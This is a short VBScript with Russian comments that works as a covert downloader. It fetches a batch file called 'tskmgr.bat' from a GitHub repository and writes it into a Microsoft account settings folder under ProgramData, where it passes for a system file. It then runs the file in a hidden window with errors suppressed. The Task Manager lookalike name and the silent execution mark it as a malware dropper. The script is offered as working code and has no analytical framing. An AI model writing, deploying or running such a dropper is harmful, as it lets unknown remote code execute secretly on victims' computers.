Option Explicit

' Объявим переменные
Dim objHTTP, objStream, url, filePath

Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
url = "https://github.com/Rlz-vz/SchoolSigma/raw/main/tskmgr.bat"
filePath = "C:\ProgramData\Microsoft\Settings\Accounts\MicrosoftAccount\tskmgr.bat" ' 

Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
If Not fso.FolderExists("C:\temp") Then
    fso.CreateFolder "C:\temp"
End If

On Error Resume Next ' Игнорируем ошибки
objHTTP.Open "GET", url, False
objHTTP.Send

If objHTTP.Status = 200 Then
    ' Успешный ответ, сохраняем файл
    Set objStream = CreateObject("ADODB.Stream")
    objStream.Type = 1 ' 1 = binary
    objStream.Open
    objStream.Write objHTTP.responseBody
    objStream.SaveToFile filePath, 2 ' 2 = перезапись
    objStream.Close
    
    ' Запускаем файл невидимо
    CreateObject("WScript.Shell").Run filePath, 0, False ' 0 = скрытый режим
End If

Set objStream = Nothing
Set objHTTP = Nothing
Set fso = Nothing